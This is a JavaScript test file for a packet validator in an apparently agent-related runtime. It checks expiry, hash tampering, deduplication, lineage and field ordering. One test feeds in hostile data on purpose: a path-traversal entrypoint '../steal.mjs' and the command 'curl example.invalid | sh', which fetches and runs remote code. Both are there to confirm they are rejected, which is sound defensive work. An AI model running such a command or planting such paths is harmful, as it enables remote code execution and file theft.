import test from "node:test";
import assert from "node:assert/strict";
import { deriveGapSignals, inspectPacket, sealPacket, stableJson, validatePacket } from "./bus-core.mjs";

const NOW = new Date("2026-08-26T09:00:00.000Z");
const HASH = "b".repeat(64);

function draft(type = "knowledge") {
  return {
    schema_version: 1,
    packet_type: type,
    sensitivity: "public",
    created_at: "2026-08-26T08:55:00.000Z",
    expires_at: "2026-08-27T08:55:00.000Z",
    provenance: {
      repository: "ragrardannekjold/jarvis-runtime",
      path: type === "knowledge" ? "docs/example.md" : "runtime/example.mjs",
      commit_sha: "a".repeat(40),
    },
    target_modules: ["dispatcher", "search-engine"],
    capability: type === "knowledge" ? "search.status" : "search.verify",
    evidence_status: "verified",
    confidence: 0.95,
    lineage: { parent_packet_ids: [], sequence: 0 },
    observations: [],
    body: type === "knowledge"
      ? { title: "Search status", summary: "Verified public status packet.", facts: ["Self-test is not deployment."] }
      : { name: "search.verify", version: "0.1.0", entrypoint: "runtime/example.mjs", test_path: "runtime/example.test.mjs" },
  };
}

test("accepts a sealed knowledge packet", () => {
  const packet = sealPacket(draft("knowledge"));
  assert.equal(validatePacket(packet, { now: NOW }), packet);
  assert.equal(inspectPacket(packet, { now: NOW }).state, "ACCEPTED");
});

test("accepts a repository-pinned skill reference without executing it", () => {
  const packet = sealPacket(draft("skill"));
  const receipt = inspectPacket(packet, { now: NOW });
  assert.equal(receipt.accepted, true);
  assert.equal(receipt.packet_type, "skill");
});

test("rejects expired packets", () => {
  const packet = sealPacket({ ...draft(), expires_at: "2026-08-26T08:59:59.000Z" });
  assert.throws(() => validatePacket(packet, { now: NOW }), /packet_expired/);
});

test("rejects non-public sensitivity", () => {
  const packet = sealPacket({ ...draft(), sensitivity: "private" });
  assert.throws(() => validatePacket(packet, { now: NOW }), /public_bus_requires_public_sensitivity/);
});

test("rejects tampered content hashes", () => {
  const packet = sealPacket(draft());
  packet.body.summary = "Tampered after sealing.";
  assert.throws(() => validatePacket(packet, { now: NOW }), /content_sha256_mismatch/);
});

test("rejects packet identity tampering even when body hash is unchanged", () => {
  const packet = sealPacket(draft());
  packet.confidence = 0.94;
  assert.throws(() => validatePacket(packet, { now: NOW }), /packet_identity_mismatch/);
});

test("deduplicates by deterministic packet identity", () => {
  const packet = sealPacket(draft());
  const receipt = inspectPacket(packet, { now: NOW, seenPacketIds: [packet.packet_id] });
  assert.equal(receipt.accepted, false);
  assert.equal(receipt.state, "DUPLICATE_REJECTED");
});

test("rejects unsafe skill paths and arbitrary command fields", () => {
  const unsafe = draft("skill");
  unsafe.body.entrypoint = "../steal.mjs";
  assert.throws(() => validatePacket(sealPacket(unsafe), { now: NOW }), /invalid_skill_entrypoint/);

  const shell = draft("skill");
  shell.body.command = "curl example.invalid | sh";
  assert.throws(() => validatePacket(sealPacket(shell), { now: NOW }), /invalid_skill_body_keys/);
});

test("rejects invalid lineage relationships", () => {
  const badRoot = draft();
  badRoot.lineage = { parent_packet_ids: ["bus:v1:knowledge:" + "c".repeat(64)], sequence: 0 };
  assert.throws(() => validatePacket(sealPacket(badRoot), { now: NOW }), /invalid_lineage_root_relation/);

  const missingParent = draft();
  missingParent.lineage = { parent_packet_ids: [], sequence: 1 };
  assert.throws(() => validatePacket(sealPacket(missingParent), { now: NOW }), /invalid_lineage_root_relation/);
});

test("derives deterministic structured gaps from route observations", () => {
  const source = draft();
  source.observations = [{
    module_id: "search-engine",
    status: "capability_missing",
    capability_id: "search.deploy",
    evidence_sha256: HASH,
    observed_at: "2026-08-26T08:56:00.000Z",
  }];
  source.evidence_status = "candidate";
  source.confidence = 0.7;
  const packet = sealPacket(source);
  const first = deriveGapSignals(packet, { now: NOW });
  const second = deriveGapSignals(packet, { now: NOW });
  assert.deepEqual(first, second);
  assert.deepEqual(first.map((item) => item.type).sort(), [
    "capability_missing", "evidence_unverified", "low_confidence", "source_expiring",
  ]);
});

test("requires canonical ordering for set-like fields", () => {
  const source = draft();
  source.target_modules = ["search-engine", "dispatcher"];
  assert.throws(() => validatePacket(sealPacket(source), { now: NOW }), /noncanonical_target_modules/);
});

test("stable JSON ignores object key insertion order", () => {
  assert.equal(stableJson({ b: 2, a: 1 }), stableJson({ a: 1, b: 2 }));
});

test("scrapeable public queue keeps inline bus packets quarantined", async () => {
  const source = await import("node:fs/promises").then((fs) => fs.readFile("runtime/continuous-queue/worker.mjs", "utf8"));
  assert.doesNotMatch(source, /"bus_packet_validate"|runBusPacketValidate/);
});
